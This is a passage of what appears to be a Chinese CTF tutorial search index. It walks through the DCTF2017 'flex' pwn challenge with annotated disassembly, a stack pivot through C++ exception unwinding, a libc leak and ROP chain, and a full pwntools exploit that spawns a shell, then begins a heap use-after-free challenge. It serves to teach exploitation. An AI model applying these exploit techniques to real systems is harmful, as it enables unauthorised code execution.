size_t strlen(const char *s)\n|       :   0x00401315      4839c3         cmp rbx, rax                 ; \u6bd4\u8f83 rbx \u548c rax\uff0crax \u662f\u5b57\u7b26\u4e32\u957f\u5ea6\u8fd4\u56de\u503c\n|      ,==  0x00401318      731d           jae 0x401337                 ; \u76f8\u7b49\u65f6\u8df3\u8f6c\n|      |:   0x0040131a      8b85dcfeffff   mov eax, dword [local_124h]\n|      |:   0x00401320      4898           cdqe\n|      |:   0x00401322      0fb680c06160.  movzx eax, byte [rax + 0x6061c0] ; [0x6061c0:1]=0\n|      |:   0x00401329      3c2e           cmp al, 0x2e                ;  .  ; 46\n|     ,===  0x0040132b      7409           je 0x401336\n|     ||:   0x0040132d      8385dcfeffff.  add dword [local_124h], 1    ; rbx += 1\n|     ||`=  0x00401334      ebcc           jmp 0x401302\n|     ||       ; JMP XREF from 0x0040132b (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|     `---  0x00401336      90             nop\n|      |       ; JMP XREF from 0x00401318 (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|      `--  0x00401337      8b85dcfeffff   mov eax, dword [local_124h]\n|           0x0040133d      4863d8         movsxd rbx, eax\n|           0x00401340      bfc0616000     mov edi, 0x6061c0\n|           0x00401345      e806f9ffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|           0x0040134a      4839c3         cmp rbx, rax                 ; \u6bd4\u8f83 rbx \u548c rax\n|       ,=  0x0040134d      7522           jne 0x401371                 ; \u5982\u679c\u76f8\u7b49\uff0c\u5219\u8fdb\u5165\u5f02\u5e38\u5904\u7406\u673a\u5236\uff0c\u5229\u7528\u8be5\u673a\u5236\u53ef leave;ret \u5230 payload_2\n|       |   0x0040134f      bf04000000     mov edi, 4                               ; \u53c2\u6570 edi = 4\n|       |   0x00401354      e877f9ffff     call sym.imp.__cxa_allocate_exception    ; \u521b\u5efa\u5f02\u5e38\u5bf9\u8c61\uff0c\u8fd4\u56de\u5bf9\u8c61\u5730\u5740 rax\n|       |   0x00401359      c70000000000   mov dword [rax], 0                       ; \u521d\u59cb\u5316\u4e3a 0\n|       |   0x0040135f      ba00000000     mov edx, 0                               ; \u53c2\u6570 edx = 0\n|       |   0x00401364      be70616000     mov esi, obj.typeinfoforint ; 0x606170   ; \u53c2\u6570 esi = 0x606170\n|       |   0x00401369      4889c7         mov rdi, rax                             ; \u53c2\u6570 rdi = rax\n|       |   0x0040136c      e87ff9ffff     call sym.imp.__cxa_throw     ; \u5bf9\u5f02\u5e38\u5bf9\u8c61\u505a\u4e00\u4e9b\u521d\u59cb\u5316\uff0c\u8fd9\u91cc\u4f1a\u8df3\u8f6c\u5230 0x0040153d\n|       |      ; JMP XREF from 0x0040134d (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       `-  0x00401371      bf17464000     mov edi, str.md5_pattern:   ; 0x404617 ;  md5 pattern: \n|           0x00401376      e855f8ffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x0040137b      be21000000     mov esi, 0x21               ;  !  ; 33\n|           0x00401380      bfc0656000     mov edi, 0x6065c0\n|           0x00401385      e8ecfaffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x0040138a      b800000000     mov eax, 0\n|           0x0040138f      488b4de8       mov rcx, qword [local_18h]\n|           0x00401393      6448330c2528.  xor rcx, qword fs:[0x28]\n|       ,=  0x0040139c      7405           je 0x4013a3\n|       |   0x0040139e      e81df9ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x0040139c (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       `-  0x004013a3      4881c4280100.  add rsp, 0x128\n|           0x004013aa      5b             pop rbx\n|           0x004013ab      5d             pop rbp\n\\           0x004013ac      c3             ret \n\u51fd\u6570  sub.atoi_f45  \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u957f\u6574\u578b\u6570\uff1a [0x00400d80]  pdf @ sub.atoi_f45\n/ (fcn) sub.atoi_f45 74\n|   sub.atoi_f45 ();\n|           ; var int local_20h @ rbp-0x20\n|           ; var int local_8h @ rbp-0x8\n|              ; XREFS: CALL 0x004021f2  CALL 0x004011bc  CALL 0x004011d1  CALL 0x004011e6  CALL 0x004011fb  CALL 0x00401259  CALL 0x004015d9  CALL 0x00402136  \n|           0x00400f45      55             push rbp\n|           0x00400f46      4889e5         mov rbp, rsp\n|           0x00400f49      4883ec20       sub rsp, 0x20\n|           0x00400f4d      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ;  (  ; 40\n|           0x00400f56      488945f8       mov qword [local_8h], rax\n|           0x00400f5a      31c0           xor eax, eax\n|           0x00400f5c      488d45e0       lea rax, [local_20h]\n|           0x00400f60      be0b000000     mov esi, 0xb                ; 11\n|           0x00400f65      4889c7         mov rdi, rax\n|           0x00400f68      e809ffffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x00400f6d      488d45e0       lea rax, [local_20h]         ; local_20h \u6307\u5411\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\n|           0x00400f71      4889c7         mov rdi, rax                 ; rdi = rax\n|           0x00400f74      e807fdffff     call sym.imp.atoi           ; int atoi(const char *str) ; \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u957f\u6574\u578b\n|           0x00400f79      488b55f8       mov rdx, qword [local_8h]\n|           0x00400f7d      644833142528.  xor rdx, qword fs:[0x28]\n|       ,=  0x00400f86      7405           je 0x400f8d\n|       |   0x00400f88      e833fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00400f86 (sub.atoi_f45)\n|       `-  0x00400f8d      c9             leave\n\\           0x00400f8e      c3             ret \n\u53ef\u4ee5\u770b\u5230\u8be5\u51fd\u6570\u5e76\u672a\u5bf9\u6240\u8f93\u5165\u7684\u6570\u5b57\u8fdb\u884c\u9a8c\u8bc1\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\u8d1f\u6570\uff0c\u56e0\u4e3a\u8ba1\u7b97\u673a\u4e2d\u6570\u5b57\u662f\u4ee5\u8865\u7801\u7684\u5f62\u5f0f\u5b58\u5728\uff0c\u4f8b\u5982  -2 = 0xfffffffffffffffe \u3002\u8fd9\u4e2a\u6570\u5b57\u52a0 1 \u540e\uff0c\u4f5c\u4e3a\u8bfb\u5165\u5b57\u7b26\u4e32\u4e2a\u6570\u7684\u5224\u5b9a\uff0c\u56e0\u4e3a\u4e2a\u6570\u4e0d\u80fd\u4e3a\u8d1f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u5fc3\u5730\u8bfb\u5165\u540e\u9762\u7684 payload \u4e86\u3002  \u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8bfb\u5165\u64cd\u4f5c\u4f7f\u7528\u51fd\u6570  sub.read_e76 \uff0c\u8be5\u51fd\u6570\u5185\u90e8\u6709\u4e00\u4e2a\u5faa\u73af\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\uff0c\u5982\u679c\u9047\u5230\u6362\u884c\u7b26\uff0c\u5219\u5b8c\u6210\u9000\u51fa\u3002 [0x00400d80]  pdf @ sub.read_e76\n/ (fcn) sub.read_e76 168\n|   sub.read_e76 ();\n|           ; var int local_1ch @ rbp-0x1c\n|           ; var int local_18h @ rbp-0x18\n|           ; var int local_dh @ rbp-0xd\n|           ; var int local_ch @ rbp-0xc\n|           ; var int local_8h @ rbp-0x8\n|              ; XREFS: CALL 0x00400f68  CALL 0x00401186  CALL 0x0040121f  CALL 0x004012b4  CALL 0x00401385  CALL 0x0040159f  CALL 0x00401634  CALL 0x00401663  \n|              ; XREFS: CALL 0x00401705  CALL 0x00401d4f  \n|           0x00400e76      55             push rbp\n|           0x00400e77      4889e5         mov rbp, rsp\n|           0x00400e7a      4883ec20       sub rsp, 0x20\n|           0x00400e7e      48897de8       mov qword [local_18h], rdi\n|           0x00400e82      8975e4         mov dword [local_1ch], esi\n|           0x00400e85      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ;  (  ; 40\n|           0x00400e8e      488945f8       mov qword [local_8h], rax\n|           0x00400e92      31c0           xor eax, eax\n|           0x00400e94      c745f4000000.  mov dword [local_ch], 0\n|           0x00400e9b      c745f4000000.  mov dword [local_ch], 0\n|              ; JMP XREF from 0x00400ef1 (sub.read_e76)\n|       .-  0x00400ea2      8b45f4         mov eax, dword [local_ch]    ; \u5faa\u73af\u8d77\u70b9\uff0clocal_ch \u5b58\u653e\u5df2\u8f93\u5165\u5b57\u7b26\u6570\u91cf\n|       :   0x00400ea5      3b45e4         cmp eax, dword [local_1ch]   ; \u5141\u8bb8\u8bfb\u5165\u7684\u6570\u91cf\n|      ,==  0x00400ea8      7349           jae 0x400ef3                 ; \u76f8\u7b49\u65f6\u8df3\u8f6c\u3000\uff08\u5f53\u8bfb\u5165payload_!\u65f6\uff0c\u7531\u4e8e\u6211\u4eec\u8f93\u5165\u7684\u662f\u4e00\u4e2a\u8d1f\u6570\uff0c\u800c eax \u662f\u975e\u8d1f\u6570\uff0c\u6c38\u8fdc\u4e0d\u4f1a\u76f8\u7b49\uff09\n|      |:   0x00400eaa      488d45f3       lea rax, [local_dh]\n|      |:   0x00400eae      ba01000000     mov edx, 1                   ; nbyte = 1\n|      |:   0x00400eb3      4889c6         mov rsi, rax                 ; buf = rsi = [local_dh]\n|      |:   0x00400eb6      bf00000000     mov edi, 0                   ; fildes = edi = 0\n|      |:   0x00400ebb      e830fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte) ; \u6bcf\u6b21\u8bfb\u5165 1 \u4e2a\u5b57\u7b26\n|      |:   0x00400ec0      0fb645f3       movzx eax, byte [local_dh]   ; \u53d6\u51fa\u8f93\u5165\u5b57\u7b26\n|      |:   0x00400ec4      3c0a           cmp al, 0xa                 ; 10 ; \u6bd4\u8f83\u8f93\u5165\u5b57\u7b26\u662f\u4e0d\u662f  \\n \n|     ,===  0x00400ec6      7515           jne 0x400edd                 ; \u4e0d\u662f\u5219\u8df3\u8f6c\n|     ||:   0x00400ec8      8b55f4         mov edx, dword [local_ch]\n|     ||:   0x00400ecb      488b45e8       mov rax, qword [local_18h]\n|     ||:   0x00400ecf      4801d0         add rax, rdx                ;  ( \n|     ||:   0x00400ed2      c60000         mov byte [rax], 0\n|     ||:   0x00400ed5      8b45f4         mov eax, dword [local_ch]\n|     ||:   0x00400ed8      83c001         add eax, 1\n|    ,====  0x00400edb      eb2b           jmp 0x400f08\n|    |||:      ; JMP XREF from 0x00400ec6 (sub.read_e76)\n|    |`---  0x00400edd      8b55f4         mov edx, dword [local_ch]    ; \u53d6\u51fa\u5b57\u7b26\u6570\u91cf\n|    | |:   0x00400ee0      488b45e8       mov rax, qword [local_18h]   ; local_18h \u4e3a\u76ee\u6807\u521d\u59cb\u5730\u5740\n|    | |:   0x00400ee4      4801c2         add rdx, rax                ;  #  ; rdx \u6307\u5411\u76ee\u6807\u5730\u5740\n|    | |:   0x00400ee7      0fb645f3       movzx eax, byte [local_dh]   ; \u53d6\u51fa\u8bfb\u5165\u5b57\u7b26\n|    | |:   0x00400eeb      8802           mov byte [rdx], al           ; \u5c06\u8bfb\u5165\u5b57\u7b26\u5b58\u653e\u5230 [rdx]\n|    | |:   0x00400eed      8345f401       add dword [local_ch], 1      ; local_ch += 1\n|    | |`=  0x00400ef1      ebaf           jmp 0x400ea2                 ; \u5faa\u73af\uff0c\u7ee7\u7eed\u8bfb\u5165\u5b57\u7b26\n|    | |       ; JMP XREF from 0x00400ea8 (sub.read_e76)\n|    | `--  0x00400ef3      8b45e4         mov eax, dword [local_1ch]\n|    |      0x00400ef6      83e801         sub eax, 1\n|    |      0x00400ef9      89c2           mov edx, eax\n|    |      0x00400efb      488b45e8       mov rax, qword [local_18h]\n|    |      0x00400eff      4801d0         add rax, rdx                ;  ( \n|    |      0x00400f02      c60000         mov byte [rax], 0\n|    |      0x00400f05      8b45f4         mov eax, dword [local_ch]\n|    |         ; JMP XREF from 0x00400edb (sub.read_e76)\n|    `----  0x00400f08      488b4df8       mov rcx, qword [local_8h]    ; \u8bfb\u5b8c\u5b57\u7b26\u4e32\uff0c\u8df3\u51fa\u5faa\u73af\n|           0x00400f0c      6448330c2528.  xor rcx, qword fs:[0x28]\n|       ,=  0x00400f15      7405           je 0x400f1c\n|       |   0x00400f17      e8a4fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00400f15 (sub.read_e76)\n|       `-  0x00400f1c      c9             leave\n\\           0x00400f1d      c3             ret  \u5206\u6790\u5b8c\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u5199 exp \u5427\u3002", 
            "title": "\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.8_pwn_dctf2017_flex/#stack-pivot", 
            "text": "\u5728  0x004012b4  \u4e0b\u65ad\u70b9\uff0c\u4ee5\u68c0\u67e5\u6ea2\u51fa\u70b9\uff1a gdb-peda$ x/s $rbp\n0x7fffffffe3f0:  5A%KA%gA%6A% \ngdb-peda$ pattern_offset 5A%KA%gA%6A%\n5A%KA%gA%6A% found at offset: 288 \n\u6240\u4ee5\u7f13\u51b2\u533a\u7684\u957f\u5ea6\u4e3a  288 / 8 = 36 \u3002\u5229\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u8986\u76d6\u6389 rbp\uff0c\u5728\u5f02\u5e38\u5904\u7406\u8fc7\u7a0b\u4e2d\uff0cunwind \u4f8b\u7a0b\u5411\u4e0a\u4e00\u7ea7\u4e00\u7ea7\u5730\u627e\u5f02\u5e38\u5904\u7406\u51fd\u6570\uff0c\u7136\u540e\u6062\u590d\u76f8\u5173\u6570\u636e\uff0c\u8fd9\u6837\u5c31\u5c06\u6808\u8f6c\u79fb\u5230\u4e86\u65b0\u5730\u5740\uff1a # stack pivot  payload_1    =   AAAAAAAA   *   36  payload_1   +=   p64 ( pivote_addr )  payload_1   +=   p64 ( unwind_addr )  \nunwind_addr \u5fc5\u987b\u662f\u8c03\u7528\u51fd\u6570\u91cc\u7684\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u6837\u629b\u51fa\u7684\u5f02\u5e38\u624d\u80fd\u88ab\u8c03\u7528\u51fd\u6570\u5185\u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570 catch\u3002", 
            "title": "stack pivot"
        }, 
        {
            "location": "/pwn/lab/6.1.8_pwn_dctf2017_flex/#get-puts-address", 
            "text": "\u5f02\u5e38\u5904\u7406\u51fd\u6570\u7ed3\u675f\u540e\uff0c\u6267\u884c\u4e0b\u9762\u4e24\u53e5\uff1a |      `--  0x0040155f      c9             leave\n\\           0x00401560      c3             ret                          ; ret \u5230 payload_2 \n\u901a\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u6784\u9020 rop \u8c03\u7528 read() \u8bfb\u5165 one-gadget \u6765\u83b7\u5f97 shell\uff0c\u4f46\u53ef\u7528\u7684 gadget \u53ea\u80fd\u63a7\u5236 rdi \u548c rsi\uff0c\u800c\u4e0d\u80fd\u63a7\u5236 rdx\u3002\u6240\u4ee5\u5fc5\u987b\u901a\u8fc7\u51fd\u6570  sub.read_f1e  \u6765\u505a\u5230\u8fd9\u4e00\u70b9\u3002 $ ropgadget --binary flex --only  pop|ret \n...\n0x00000000004044d3 : pop rdi ; ret\n0x00000000004044d1 : pop rsi ; pop r15 ; ret  [0x00400d80]  pdf @ sub.read_f1e\n/ (fcn) sub.read_f1e 39\n|   sub.read_f1e ();\n|           ; var int local_10h @ rbp-0x10\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x004012e3 (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|           0x00400f1e      55             push rbp\n|           0x00400f1f      4889e5         mov rbp, rsp\n|           0x00400f22      4883ec10       sub rsp, 0x10\n|           0x00400f26      48897df8       mov qword [local_8h], rdi\n|           0x00400f2a      488975f0       mov qword [local_10h], rsi\n|           0x00400f2e      488b55f0       mov rdx, qword [local_10h]   ; rdx = \u4f20\u5165\u7684 rsi\n|           0x00400f32      488b45f8       mov rax, qword [local_8h]\n|           0x00400f36      4889c6         mov rsi, rax                 ; rsi = \u4f20\u5165\u7684 rdi\n|           0x00400f39      bf00000000     mov edi, 0                   ; fildes = 0\n|           0x00400f3e      e8adfcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x00400f43      c9             leave\n\\           0x00400f44      c3             ret \n\u6784\u9020 paylode_2 \u6253\u5370\u51fa puts \u7684\u5730\u5740\uff0c\u5e76\u8c03\u7528  read_f1e  \u8bfb\u5165 payload_3 \u5230  pivote_addr + 0x50  \u7684\u4f4d\u7f6e\uff1a # get puts address  payload_2    =   AAAAAAAA  payload_2   +=   p64 ( pop_rdi )  payload_2   +=   p64 ( puts_got )  payload_2   +=   p64 ( puts_plt )  payload_2   +=   p64 ( pop_rdi )  payload_2   +=   p64 ( pivote_addr   +   0x50 )  payload_2   +=   p64 ( pop_rsi_r15 )  payload_2   +=   p64 ( 8 )  payload_2   +=   AAAAAAAA  payload_2   +=   p64 ( read_f1e )  io . sendline ( payload_2 )  io . recvuntil ( pattern: \\n )  puts_addr   =   io . recvuntil ( \\n )[: - 1 ] . ljust ( 8 , \\x00 )  puts_addr   =   u64 ( puts_addr )", 
            "title": "get puts address"
        }, 
        {
            "location": "/pwn/lab/6.1.8_pwn_dctf2017_flex/#get-shell", 
            "text": "\u627e\u5230 libc \u7684  do_system  \u51fd\u6570\u91cc\u7684 one-gadget \u5730\u5740\u4e3a  0x00041ee7 \uff1a |           0x00041ee7      488b056aff36.  mov rax, qword [0x003b1e58] ; [0x3b1e58:8]=0\n|           0x00041eee      488d3d409313.  lea rdi, str._bin_sh        ; 0x17b235 ;  /bin/sh \n|           0x00041ef5      c70521253700.  mov dword [obj.lock_4], 0   ; [0x3b4420:4]=0\n|           0x00041eff      c7051b253700.  mov dword [obj.sa_refcntr], 0 ; [0x3b4424:4]=0\n|           0x00041f09      488d742430     lea rsi, [local_30h]        ; sym.lm_cache ; 0x30\n|           0x00041f0e      488b10         mov rdx, qword [rax]\n|           0x00041f11      67e8c9260800   call sym.execve \n\u901a\u8fc7\u6cc4\u9732\u51fa\u7684 puts \u5730\u5740\uff0c\u8ba1\u7b97\u7b26\u53f7\u504f\u79fb\u5f97\u5230 one-gadget \u5730\u5740\uff0c\u6784\u9020 payload_3\uff1a libc_base   =   puts_addr   -   libc . symbols [ puts ]  one_gadget   =   libc_base   +   0x00041ee7  # get shell  payload_3   =   p64 ( one_gadget )   Bingo!!! $ python2 exp.py\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*]  /usr/lib/libc-2.26.so \n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n[*] Switching to interactive mode\n$ whoami\nfirmy", 
            "title": "get shell"
        }, 
        {
            "location": "/pwn/lab/6.1.8_pwn_dctf2017_flex/#exploit", 
            "text": "\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a from   pwn   import   *  io   =   remote ( 127.0.0.1 ,   10001 )  libc   =   ELF ( /usr/lib/libc-2.26.so )  io . recvuntil ( option: \\n )  io . sendline ( 1 )  io . recvuntil ( (yes/No) )  io . sendline ( No )  io . recvuntil ( (yes/No) )  io . sendline ( yes )  io . recvuntil ( length: )  io . sendline ( -3 )  io . recvuntil ( charset: )  puts_plt   =   0x00400bD0  puts_got   =   0x00606020  read_f1e   =   0x00400f1e  pop_rdi   =   0x004044d3          # pop rdi ; ret  pop_rsi_r15   =   0x004044d1      # pop rsi ; pop r15 ; ret  pivote_addr   =   0x6061C0  unwind_addr   =   0x00401509      # make sure unwind can find the catch routine  # stack pivot  payload_1    =   AAAAAAAA   *   36  payload_1   +=   p64 ( pivote_addr )  payload_1   +=   p64 ( unwind_addr )  io . sendline ( payload_1 )  io . recvuntil ( \\n )  # get puts address  payload_2    =   AAAAAAAA         # fake ebp  payload_2   +=   p64 ( pop_rdi )  payload_2   +=   p64 ( puts_got )  payload_2   +=   p64 ( puts_plt )  payload_2   +=   p64 ( pop_rdi )  payload_2   +=   p64 ( pivote_addr   +   0x50 )  payload_2   +=   p64 ( pop_rsi_r15 )  payload_2   +=   p64 ( 8 )  payload_2   +=   AAAAAAAA  payload_2   +=   p64 ( read_f1e )  io . sendline ( payload_2 )  io . recvuntil ( pattern: \\n )  puts_addr   =   io . recvuntil ( \\n )[: - 1 ] . ljust ( 8 , \\x00 )  puts_addr   =   u64 ( puts_addr )  libc_base   =   puts_addr   -   libc . symbols [ puts ]  one_gadget   =   libc_base   +   0x00041ee7  # get shell  payload_3   =   p64 ( one_gadget )  io . sendline ( payload_3 )  io . interactive ()   \u6700\u540e\u5efa\u8bae\u8bfb\u8005\u81ea\u5df1\u591a\u8c03\u8bd5\u51e0\u904d\uff0c\u4ee5\u52a0\u6df1\u5bf9\u5f02\u5e38\u5904\u7406\u673a\u5236\u7684\u7406\u89e3\u3002", 
            "title": "Exploit"
        }, 
        {
            "location": "/pwn/lab/6.1.8_pwn_dctf2017_flex/#_3", 
            "text": "Shanghai-DCTF-2017 \u7ebf\u4e0b\u653b\u9632Pwn\u9898  c++ \u5f02\u5e38\u5904\u7406\uff081\uff09  C++\u5f02\u5e38\u673a\u5236\u7684\u5b9e\u73b0\u65b9\u5f0f\u548c\u5f00\u9500\u5206\u6790", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/", 
            "text": "\u9898\u76ee\u590d\u73b0\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\n\u9898\u76ee\u590d\u73b0\n\n\n\u8fd9\u4e2a\u9898\u76ee\u7ed9\u51fa\u4e86\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c libc\u3002\n\n$ file main.bin\nmain.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ec9db5ec0b8ad99b3b9b1b3b57e5536d1c615c8e, not stripped\n$ checksec -f main.bin\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     0               10      main.bin\n\n\n64 \u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u63aa\u65bd\u9664\u4e86 PIE \u90fd\u5f00\u542f\u4e86\u3002\n\n\n\u4f46\u5176\u5b9e\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u8fd0\u884c\uff0c\u5b83\u662f\u4e00\u4e2a\u7ebf\u4e0b\u8d5b\u7684\u9898\u76ee\uff0c\u4f1a\u5bf9\u505a\u4e00\u4e9b\u73af\u5883\u68c0\u67e5\u548c\u5904\u7406\uff0c\u76f4\u63a5 nop \u6389\u5c31\u597d\u4e86\uff1a\n\n|           0x004021ad      bf18264000     mov edi, 0x402618\n|           0x004021b2      e87ceeffff     call sym.background_process\n|           0x004021b7      bf39050000     mov edi, 0x539              ; 1337\n|           0x004021bc      e85eefffff     call sym.serve_forever\n|           0x004021c1      8945f8         mov dword [local_8h], eax\n|           0x004021c4      8b45f8         mov eax, dword [local_8h]\n|           0x004021c7      89c7           mov edi, eax\n|           0x004021c9      e8c6f0ffff     call sym.set_io\n\n\n\n$ python2 -c \nprint \n90\n*33\n \n nop.txt\n\n\n\n[0x00400ec0]\n s 0x004021ad\n[0x004021ad]\n cat ./nop.txt\n909090909090909090909090909090909090909090909090909090909090909090\n[0x004021ad]\n wxf ./nop.txt\n\n\n\n\u6700\u540e\u628a\u5b83\u8fd0\u884c\u8d77\u6765\uff1a\n\nsocat tcp4-listen:10001,reuseaddr,fork exec:\nenv LD_PRELOAD=./libc.so.6 ./main.elf\n \n\n\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n\u73a9\u4e00\u4e0b\uff0c\u4e00\u770b\u5c31\u662f\u5806\u5229\u7528\u7684\u9898\u76ee\uff1a\n\n$ ./main.elf\nWelcome to your TeamManager (TM)!\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice:\n\n\n\u7a0b\u5e8f\u5c31\u662f\u6dfb\u52a0\u3001\u5220\u9664\u3001\u7f16\u8f91\u548c\u663e\u793a\u7403\u5458\u4fe1\u606f\u3002\u4f46\u8981\u6ce8\u610f\u7684\u662f\u5728\u7f16\u8f91\u548c\u663e\u793a\u7403\u5458\u524d\uff0c\u9700\u8981\u5148\u9009\u62e9\u7403\u5458\uff0c\u8fd9\u4e00\u70b9\u5f88\u91cd\u8981\u3002\n\n\n\u6dfb\u52a0\u4e24\u4e2a\u7403\u5458\u770b\u770b\uff1a\n\nYour choice: 1\nFound free slot: 0\nEnter player name: aaaa\nEnter attack points: 1\nEnter defense points: 2\nEnter speed: 3\nEnter precision: 4\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 1\nFound free slot: 1\nEnter player name: bbbb\nEnter attack points: 5\nEnter defense points: 6\nEnter speed: 7\nEnter precision: 8\n\n\n\u8bd5\u7740\u9009\u4e2d\u7b2c\u4e00\u4e2a\u7403\u5458\uff0c\u7136\u540e\u5220\u9664\u5b83\uff1a\n\nYour choice: 3\nEnter index: 0\nPlayer selected!\n        Name: aaaa\n        A/D/S/P: 1,2,3,4\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 2\nEnter index: 0\nShe\ns gone!\n\n\n\u63a5\u4e0b\u6765\u76f4\u63a5\u663e\u793a\u8be5\u7403\u5458\u4fe1\u606f\uff1a\n\nYour choice: 5\n        Name:\n        A/D/S/P: 29082240,0,3,4\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 6\nYour team:\nPlayer 0\n        Name: bbbb\n        A/D/S/P: 5,6,7,8\n\n\n\u5947\u602a\u7684\u4e8b\u60c5\u53d1\u751f\u4e86\uff0c\u7a0b\u5e8f\u6ca1\u6709\u63d0\u9192\u6211\u4eec\u7403\u5458\u4e0d\u5b58\u5728\uff0c\u800c\u662f\u76f4\u63a5\u8bfb\u53d6\u4e86\u5185\u5b58\u4e2d\u7684\u4fe1\u606f\u3002\n\n\n\u4e8e\u662f\u6211\u4eec\u731c\u6d4b\uff0c\u7a0b\u5e8f\u5728 free \u7403\u5458\u65f6\u6ca1\u6709\u5c06 select \u7684\u503c\u7f6e\u7a7a\uff0c\u5bfc\u81f4\u4e86 use-after-free \u7684\u95ee\u9898\u3002\u5173\u4e8e UAF \u5df2\u7ecf\u5728\u524d\u9762\u7684\u7ae0\u8282\u4e2d\u8bb2\u8fc7\u4e86\u3002\n\n\n\u5f88\u660e\u663e\uff0c\u6bcf\u4e2a\u7403\u5458\u90fd\u662f\u4e00\u4e2a\u4e0b\u9762\u8fd9\u6837\u7684\u7ed3\u6784\u4f53\uff1a\n\nstruct\n \nplayer\n \n{\n\n    \nint32_t\n \nattack_pts\n;\n\n    \nint32_t\n \ndefense_pts\n;\n\n    \nint32_t\n \nspeed\n;\n\n    \nint32_t\n \nprecision\n;\n\n    \nchar\n \n*\nname\n;\n\n\n}\n\n\n\n\n\u9759\u6001\u5206\u6790\n\n\n\u5148\u6765\u770b\u4e00\u4e0b\u6dfb\u52a0\u7403\u5458\u7684\u8fc7\u7a0b\uff0c\u51fd\u6570 \nsym.add_player\n\uff1a\n\n[0x00400ec0]\n pdf @ sym.add_player\n/ (fcn) sym.add_player 789\n|   sym.add_player ();\n|           ; var int local_11ch @ rbp-0x11c\n|           ; var int local_118h @ rbp-0x118\n|           ; var int local_110h @ rbp-0x110\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x00402235 (main + 148)\n|           0x00401801      55             push rbp\n|           0x00401802      4889e5         mov rbp, rsp\n|           0x00401805      4881ec200100.  sub rsp, 0x120\n|           0x0040180c      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; \n(\n ; 40\n|           0x00401815      488945f8       mov qword [local_8h], rax\n|           0x00401819      31c0           xor eax, eax\n|           0x0040181b      48c785e8feff.  mov qword [local_118h], 0\n|           0x00401826      c785e4feffff.  mov dword [local_11ch], 0    ; player \u7f16\u53f7\u521d\u59cb\u503c\u4e3a 0\n|       ,=\n 0x00401830      eb07           jmp 0x401839\n|       |      ; JMP XREF from 0x00401853 (sym.add_player)\n|      .--\n 0x00401832      8385e4feffff.  add dword [local_11ch], 1    ; \u7f16\u53f7\u52a0 1\n|      :|      ; JMP XREF from 0x00401830 (sym.add_player)\n|      :`-\n 0x00401839      83bde4feffff.  cmp dword [local_11ch], 0xa ; [0xa:4]=-1 ; 10\n|      :,=\n 0x00401840      7713           ja 0x401855\n|      :|   0x00401842      8b85e4feffff   mov eax, dword [local_11ch]\n|      :|   0x00401848      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0\n|      :|   0x00401850      4885c0         test rax, rax\n|      `==\n 0x00401853      75dd           jne 0x401832\n|       |      ; JMP XREF from 0x00401840 (sym.add_player)\n|       `-\n 0x00401855      83bde4feffff.  cmp dword [local_11ch], 